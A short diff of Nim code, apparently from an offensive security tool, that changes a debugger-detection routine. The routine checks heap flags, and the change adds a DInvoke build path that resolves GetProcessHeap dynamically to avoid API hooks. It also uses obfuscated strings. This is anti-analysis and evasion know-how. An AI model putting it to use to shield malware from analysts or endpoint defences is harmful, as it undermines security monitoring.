@@ -58,8 +58,12 @@ proc AmIDebugged*(): bool =
       return false
 
 proc isHeapGrowable*(): bool =
-  var pHeapFlags = cast[ptr DWORD](cast[ptr BYTE](GetProcessHeap()) + 0x70)
-  var pHeapForceFlags = cast[ptr DWORD](cast[ptr BYTE](GetProcessHeap()) + 0x74)
+  when defined(DInvoke):
+      var pHeapFlags = cast[ptr DWORD](cast[ptr BYTE](MyGetProcessHeap()) + 0x70)
+      var pHeapForceFlags = cast[ptr DWORD](cast[ptr BYTE](MyGetProcessHeap()) + 0x74)
+  else:  
+      var pHeapFlags = cast[ptr DWORD](cast[ptr BYTE](GetProcessHeap()) + 0x70)
+      var pHeapForceFlags = cast[ptr DWORD](cast[ptr BYTE](GetProcessHeap()) + 0x74)
   if (pHeapFlags[] != HEAP_GROWABLE) or (pHeapForceFlags[] != 0):
     when defined(verbose):
       echo obf("[-] Heap is not growable")
